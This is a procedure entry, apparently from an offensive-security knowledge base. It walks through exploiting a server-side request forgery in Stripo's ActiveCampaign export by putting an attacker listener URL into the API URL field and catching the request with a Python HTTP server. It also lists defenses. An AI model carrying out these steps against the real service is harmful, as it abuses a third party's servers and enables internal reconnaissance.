---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - ssrf
  - web
  - export
  - activecampaign
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/setup-ssrf-listener]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:48.297Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-SSRF-via-ActiveCampaign-Export-in-Stripo

## Summary

This procedure exploits a Server-Side Request Forgery (SSRF) vulnerability in Stripo's ActiveCampaign export feature by injecting an arbitrary URL into the API endpoint field, forcing the Stripo server to make unauthorized HTTP/HTTPS requests to attacker-controlled or internal resources.

## Description

The SSRF occurs due to insufficient validation of the API URL input in the export template workflow for ActiveCampaign integration. An authenticated user can supply any URL, leading to the server initiating connections to potentially sensitive internal services or external attacker endpoints. This enables reconnaissance of internal networks, port scanning, or data exfiltration. The attack requires a valid Stripo account and an attacker server to observe requests, with impacts including exposure of internal metadata or bypass of network restrictions.

## Requirements

1. Valid credentials for a Stripo account
2. Web browser (e.g., Chrome) for UI navigation
3. Attacker-controlled server with a public IP/port for receiving requests (e.g., port 8080 open)
4. Basic knowledge of HTTP requests and logging

## Defense

Defensive measures and detection strategies:

- Implement URL whitelist validation for API endpoints in export features, restricting to official ActiveCampaign domains
- Use network segmentation and firewalls to block outbound requests from application servers to internal IPs
- Monitor application logs for unusual outbound HTTP requests, especially to non-standard ports or external IPs
- Enable rate limiting on export functions to prevent abuse

## Objectives

1. Force the Stripo server to connect to an arbitrary endpoint
2. Confirm SSRF by observing the incoming request on the attacker server
3. Potentially access internal resources if the URL targets localhost or private IPs

## Instructions

### Step 1: Authenticate and Prepare Template

**Context**: Access the platform and set up a template to reach the export interface.

Log in to https://my.stripo.email, navigate to templates at https://my.stripo.email/cabinet/#/templates/, create a new template by clicking 'Create your first mail', and select a basic one.

### Step 2: Access Export and Target ActiveCampaign

**Context**: Initiate the vulnerable export flow.

Click the 'Export' button in the template editor, then select 'ActiveCampaign' from the options.

### Step 3: Inject SSRF Payload

**Context**: Supply the malicious URL to trigger the forgery.

In the form, enter your listener URL (e.g., http://your-server.com:8080/test) in the API URL field and a dummy value like 'dummy' in the API Key field.

### Step 4: Execute and Verify

**Context**: Submit to force the request and capture evidence.

Click 'Export'. Start your listener beforehand with [[commands/setup-ssrf-listener]]:

```bash
python3 -m http.server 8080
```

> This starts a simple HTTP server; check console for incoming GET/POST requests from Stripo's IP, confirming the SSRF with details like User-Agent or export payload.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/setup-ssrf-listener]]

## Tools Used


## Tags

- ssrf
- web-vulnerability
- export-abuse
